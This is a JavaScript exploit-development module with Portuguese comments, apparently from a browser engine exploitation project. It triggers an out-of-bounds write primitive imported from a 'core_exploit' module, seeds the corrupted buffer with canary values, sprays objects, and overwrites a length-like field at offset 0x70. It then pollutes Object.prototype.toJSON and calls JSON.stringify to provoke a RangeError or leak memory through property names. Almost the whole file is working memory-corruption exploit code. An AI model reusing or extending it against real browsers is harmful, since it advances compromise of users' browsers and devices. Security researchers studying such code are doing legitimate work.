// js/script3/testForInPhantomPropertyLeak.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    oob_read_absolute, // Para verificar canários
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

class MyComplexObjectForRangeError { // Mantendo a classe que demonstrou o RangeError
    constructor(id) {
        this.id = `MyComplexObjRE-${id}`;
        this.marker = 0xFEFEFEFE;
        this.prop1 = "complex_prop1_re";
        this.prop2 = { nested: "complex_prop2_nested_re" };
        this.propA = "valA_re";
        this.propB = 2345689;
        this.propC = null;
        this.propD = { nested_prop_re: "valD_original_re" };
        this.propE = [101, 202, 303];
    }
}

// Padrões CANARY para escrever no oob_array_buffer_real
const CANARY_QWORDS = [
    { offset: 0x100, value: new AdvancedInt64("0xAAAAAAAAAAAAAAAA"), desc: "CanaryA_QWORD" },
    { offset: 0x108, value: new AdvancedInt64("0xBBBBBBBBBBBBBBBB"), desc: "CanaryB_QWORD" },
    { offset: 0x110, value: new AdvancedInt64("0xCCCCCCCCCCCCCCCC"), desc: "CanaryC_QWORD" },
    { offset: 0x118, value: new AdvancedInt64("0xDDDDDDDDDDDDDDDD"), desc: "CanaryD_QWORD" },
    // Adicionar um padrão perto de 0x70
    { offset: 0x60,  value: new AdvancedInt64("0x6060606060606060"), desc: "CanaryNear0x60_QWORD" },
    { offset: 0x80,  value: new AdvancedInt64("0x8080808080808080"), desc: "CanaryNear0x80_QWORD" },
];
// Padrões STRING (precisam ser escritos como bytes)
const CANARY_STRINGS = [
    { offset: 0x200, value: "PROP_CANARY_ONE_01234567", desc: "CanaryStr1" },
    { offset: 0x240, value: "PROP_CANARY_TWO_ABCDEFGH", desc: "CanaryStr2" },
];

function stringToUint8Array(str) {
    const buf = new Uint8Array(str.length);
    for (let i = 0; i < str.length; i++) {
        buf[i] = str.charCodeAt(i);
    }
    return buf;
}


// toJSON que tenta capturar 'prop' se o iterador estiver corrompido
export function toJSON_AttemptPhantomPropertyLeak() {
    const FNAME_toJSON = "toJSON_AttemptPhantomPropLeak";
    let iteration_count = 0;
    const MAX_ITER_LOG_PROPS = 30;
    const MAX_ITER_SAFETY_BREAK = 100; // Reduzido para diagnóstico mais rápido se for loop infinito benigno

    let result_payload = {
        variant: FNAME_toJSON,
        id_at_entry: "N/A",
        iterations_done: 0,
        props_logged: [],
        potential_leaks_via_prop_name: [],
        access_errors: [],
        last_prop_before_error: "N/A",
        final_error: null
    };

    try {
        result_payload.id_at_entry = String(this?.id).substring(0,20);
        // Usar console.log para ter mais chance de ser visto antes de um crash total
        console.log(`[${FNAME_toJSON}] Entrando. this.id: ${result_payload.id_at_entry}`);
        logS3(`[${FNAME_toJSON}] Entrando. this.id: ${result_payload.id_at_entry}`, "info", FNAME_toJSON);
    } catch(e_id) { /* ignora */ }

    try {
        if (typeof this !== 'object' || this === null) {
            result_payload.final_error = "this is not object or null";
            return result_payload;
        }

        for (const prop in this) {
            iteration_count++;
            result_payload.last_prop_before_error = String(prop).substring(0,100); // Logar como string

            console.log(`[${FNAME_toJSON}] Iter: ${iteration_count}, Raw Prop:`, prop); // Logar o 'prop' cru
            logS3(`[${FNAME_toJSON}] Iter: ${iteration_count}, Raw Prop (type ${typeof prop}): '${String(prop).substring(0,100)}'`, "info", FNAME_toJSON);
            if (iteration_count <= MAX_ITER_LOG_PROPS) {
                 result_payload.props_logged.push(String(prop).substring(0,100));
            }

            // Verificar se 'prop' (o nome da propriedade) é um dos nossos canários QWORD (improvável, mas testar)
            // Ou se é uma string longa que pode ser um ponteiro para uma string canary.
            // A verificação mais provável é se 'prop' é uma string e corresponde a uma CANARY_STRING.
            if (typeof prop === 'string') {
                for (const canaryStr of CANARY_STRINGS) {
                    if (prop.includes(canaryStr.value) || canaryStr.value.includes(prop)) { // Checagem mútua
                        const leak_msg = `LEAK DETECTADO: 'prop' (${prop}) parece ser/conter Canary String: ${canaryStr.desc}`;
                        logS3(`[${FNAME_toJSON}]   ${leak_msg}`, "critical", FNAME_toJSON);
                        result_payload.potential_leaks_via_prop_name.push(leak_msg);
                    }
                }
            }
            // Se 'prop' for um número, poderia ser um dos QWORDs (ou parte dele) se o iterador estiver muito quebrado.
            // Isso exigiria converter AdvancedInt64 para número para comparação, o que é complexo.
            // Por agora, focamos em 'prop' como string.

            try {
                logS3(`   [${FNAME_toJSON}] Tentando acessar this['${String(prop).substring(0,50)}']...`, "info", FNAME_toJSON);
                const val = this[prop]; // PONTO CRÍTICO DO ACESSO
                logS3(`   [${FNAME_toJSON}]   Acesso a this['${String(prop).substring(0,50)}'] OK.`, "good", FNAME_toJSON);
            } catch (e_access) {
                logS3(`   [${FNAME_toJSON}]   ERRO AO ACESSAR this['${String(prop).substring(0,50)}']: ${e_access.name} - ${e_access.message}`, "error", FNAME_toJSON);
                result_payload.access_errors.push(`Error on prop '${String(prop).substring(0,50)}': ${e_access.name}`);
                // Re-lançar para ver se o RangeError global acontece aqui
                throw e_access;
            }

            if (iteration_count >= MAX_ITER_SAFETY_BREAK) {
                logS3(`[${FNAME_toJSON}] Safety break: Excedeu ${MAX_ITER_SAFETY_BREAK} iterações. Última prop: '${String(prop).substring(0,100)}'.`, "warn", FNAME_toJSON);
                result_payload.final_error = `Safety break after ${MAX_ITER_SAFETY_BREAK} iter.`;
                break;
            }
        }
        logS3(`[${FNAME_toJSON}] Loop for...in completou ${iteration_count} iterações.`, "info", FNAME_toJSON);
    } catch (e_loop_or_rethrow) {
        logS3(`[${FNAME_toJSON}] EXCEPTION NO LOOP FOR...IN ou RE-THROW: ${e_loop_or_rethrow.name} - ${e_loop_or_rethrow.message}`, "critical", FNAME_toJSON);
        result_payload.final_error = `EXCEPTION in toJSON: ${e_loop_or_rethrow.name}: ${e_loop_or_rethrow.message}`;
        if (e_loop_or_rethrow.name === 'RangeError') {
            result_payload.range_error_in_loop = true;
        }
        // Importante: NÃO re-lançar daqui para que o JSON.stringify externo capture e logue o payload.
        // O JSON.stringify em si vai falhar com RangeError se for o caso.
    }
    result_payload.iterations_done = iteration_count;
    return result_payload; // Retornar o payload mesmo que haja erros internos, para análise.
}


export async function executePhantomPropertyLeakTest() {
    const FNAME_TEST = "executePhantomPropertyLeakTest";
    logS3(`--- Iniciando Teste: Leitura de Propriedade "Fantasma" (RangeError/Leak Check) ---`, "test", FNAME_TEST);
    document.title = `Phantom Prop Leak Test`;

    // 1. Setup OOB e preencher com canários
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST); return;
    }
    logS3(`1. Preenchendo oob_array_buffer_real com padrões canary...`, "info", FNAME_TEST);
    for (const canary of CANARY_QWORDS) {
        try {
            if (canary.offset + 8 <= oob_array_buffer_real.byteLength) {
                oob_write_absolute(canary.offset, canary.value, 8);
            }
        } catch (e_fill) { /* ignora erros de escrita de canário individuais */ }
    }
    for (const canary of CANARY_STRINGS) {
        try {
            const strBytes = stringToUint8Array(canary.value);
            if (canary.offset + strBytes.length <= oob_array_buffer_real.byteLength) {
                for(let k=0; k < strBytes.length; k++) {
                    oob_write_absolute(canary.offset + k, strBytes[k], 1);
                }
                 logS3(`   String Canary '${canary.value}' escrita em ${toHex(canary.offset)}`, "info", FNAME_TEST);
            }
        } catch (e_fill_str) { /* ignora */ }
    }
    logS3("   Preenchimento com canários concluído.", "info", FNAME_TEST);


    // 2. Spray de MyComplexObjectForRangeError
    const spray_count = 5;
    const sprayed_objects = [];
    logS3(`2. Pulverizando ${spray_count} instâncias de MyComplexObjectForRangeError...`, "info", FNAME_TEST);
    for (let i = 0; i < spray_count; i++) {
        sprayed_objects.push(new MyComplexObjectForRangeError(i));
    }

    await PAUSE_S3(SHORT_PAUSE_S3);

    // 3. Realizar a corrupção OOB "gatilho"
    const corruption_offset_trigger = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const value_to_write_trigger = 0xFFFFFFFF;
    logS3(`3. Escrevendo valor trigger ${toHex(value_to_write_trigger)} em oob_ab_real[${toHex(corruption_offset_trigger)}]...`, "warn", FNAME_TEST);
    oob_write_absolute(corruption_offset_trigger, value_to_write_trigger, 4);

    await PAUSE_S3(SHORT_PAUSE_S3);

    // 4. Poluir Object.prototype.toJSON e tentar
    const ppKey_val = 'toJSON';
    let originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let toJSONPollutionApplied = false;
    let problem_or_leak_detected = false;
    const obj_to_probe = sprayed_objects[0];

    if (!obj_to_probe) {
        logS3("Nenhum objeto para sondar.", "error", FNAME_TEST);
        clearOOBEnvironment(); return;
    }

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_AttemptPhantomPropertyLeak,
            writable: true, configurable: true, enumerable: false
        });
        toJSONPollutionApplied = true;
        logS3(`4. Object.prototype.toJSON poluído com ${toJSON_AttemptPhantomPropertyLeak.name}.`, "info", FNAME_TEST);

        logS3(`5. Sondando objeto 0 (ID: ${obj_to_probe.id})... ESPERANDO RangeError ou LEAK DE PROP.`, 'warn', FNAME_TEST);
        document.title = `Sondando ${obj_to_probe.id} (PhantomLeak)`;
        try {
            console.log(`--- [${FNAME_TEST}] ANTES de JSON.stringify(obj_to_probe) ---`);
            const stringifyResultPayload = JSON.stringify(obj_to_probe); // Chama a toJSON poluída
            console.log(`--- [${FNAME_TEST}] APÓS JSON.stringify(obj_to_probe) ---`);

            logS3(`     JSON.stringify(obj[0]) completou. Resultado da toJSON:`, "info", FNAME_TEST);
            logS3(JSON.stringify(stringifyResultPayload, null, 2), "leak", FNAME_TEST); // Log formatado do payload da toJSON

            if (stringifyResultPayload) {
                if (stringifyResultPayload.potential_leaks_via_prop_name && stringifyResultPayload.potential_leaks_via_prop_name.length > 0) {
                    logS3(`     !!!! LEAK DE NOME DE PROPRIEDADE DETECTADO !!!!`, "critical", FNAME_TEST);
                    document.title = "LEAK via Prop Name!";
                    problem_or_leak_detected = true;
                }
                if (stringifyResultPayload.range_error_in_loop) {
                     logS3(`     RangeError capturado DENTRO da toJSON.`, "vuln", FNAME_TEST);
                     problem_or_leak_detected = true; // Já é um problema
                } else if (stringifyResultPayload.final_error) {
                    logS3(`     Erro final reportado pela toJSON: ${stringifyResultPayload.final_error}`, "error", FNAME_TEST);
                    problem_or_leak_detected = true;
                }
            }

        } catch (e_str) { // Captura RangeError do JSON.stringify em si
            console.error(`--- [${FNAME_TEST}] ERRO NO CATCH de JSON.stringify: ${e_str.name} ---`, e_str);
            logS3(`     !!!! ERRO AO STRINGIFY obj[0] !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
            if (e_str.stack) {
                logS3(`       Stack: ${e_str.stack}`, "error", FNAME_TEST);
            }
            if (e_str.name === 'RangeError') {
                logS3(`       ---> RangeError (Estouro de Pilha Nativo) OCORREU! <---`, "vuln", FNAME_TEST);
                document.title = `RangeError REPRODUCED (PhantomLeak)!`;
            }
            problem_or_leak_detected = true;
        }

    } catch (e_main) {
        logS3(`Erro principal no teste: ${e_main.message}`, "error", FNAME_TEST);
        problem_or_leak_detected = true;
    } finally {
        if (toJSONPollutionApplied) {
            if (originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc);
            else delete Object.prototype[ppKey_val];
        }
    }

    if (!problem_or_leak_detected) {
        logS3("Nenhum problema óbvio (RangeError, Leak de Prop) detectado.", "good", FNAME_TEST);
    }

    clearOOBEnvironment();
    logS3(`--- Teste Leitura de Propriedade "Fantasma" CONCLUÍDO ---`, "test", FNAME_TEST);
    if (document.title.includes("LEAK") || document.title.includes("REPRODUCED")) {
        // Manter
    } else if (!problem_or_leak_detected) {
        document.title = `PhantomPropLeak OK`;
    }
}
